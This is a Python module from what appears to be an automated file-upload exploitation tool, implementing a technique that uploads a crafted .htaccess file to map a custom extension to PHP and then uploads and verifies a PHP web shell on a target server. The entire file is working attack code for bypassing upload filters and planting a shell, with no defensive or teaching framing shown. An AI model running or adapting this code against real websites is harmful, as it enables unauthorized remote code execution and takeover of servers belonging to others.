from .base import Strategy
from core.common import build_url, extract_php_extension, marker_result
from core.models import StrategyResult
class HtaccessStrategy(Strategy):
    name = "htaccess"
    def run(self, session, csrf, config, logger):
        logger.info("Technique 4: .htaccess extension mapping")
        if not config.HTACCESS_FILE.exists(): return StrategyResult(False, self.name, f"File not found: {config.HTACCESS_FILE}")
        content = config.HTACCESS_FILE.read_bytes()
        extension = extract_php_extension(content.decode("utf-8", errors="replace"))
        if not extension: return StrategyResult(False, self.name, "Could not detect mapped PHP extension.")
        logger.info(f"Detected extension: {extension}")
        upload_url = build_url(config.TARGET, config.UPLOAD_URL)
        data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
        if csrf: data[config.UPLOAD_CSRF_FIELD] = csrf
        files = {config.UPLOAD_FILE_FIELD: (config.HTACCESS_FILENAME, content, "application/octet-stream")}
        try:
            r1 = session.post(upload_url, data=data, files=files, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            logger.info(f".htaccess upload: HTTP {r1.status_code}")
            if r1.status_code >= 400: return StrategyResult(False, self.name, f".htaccess upload rejected: HTTP {r1.status_code}")
            shell = f"{config.HTACCESS_SHELL_PREFIX}{extension}"
            data2 = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
            if csrf: data2[config.UPLOAD_CSRF_FIELD] = csrf
            files2 = {config.UPLOAD_FILE_FIELD: (shell, config.PHP_PAYLOAD.encode(), "application/octet-stream")}
            r2 = session.post(upload_url, data=data2, files=files2, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            logger.info(f"Mapped shell upload: HTTP {r2.status_code}")
            if r2.status_code >= 400: return StrategyResult(False, self.name, f"Mapped shell upload rejected: HTTP {r2.status_code}")
            path = config.HTACCESS_VERIFY_URL or config.VERIFY_BASE_URL.rstrip("/") + "/" + shell
            verify_url = build_url(config.TARGET, path)
            v = session.get(verify_url, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            return marker_result(self.name, v, verify_url, config.SUCCESS_MARKER, config.END_MARKER, shell)
        except Exception as exc: return StrategyResult(False, self.name, str(exc))
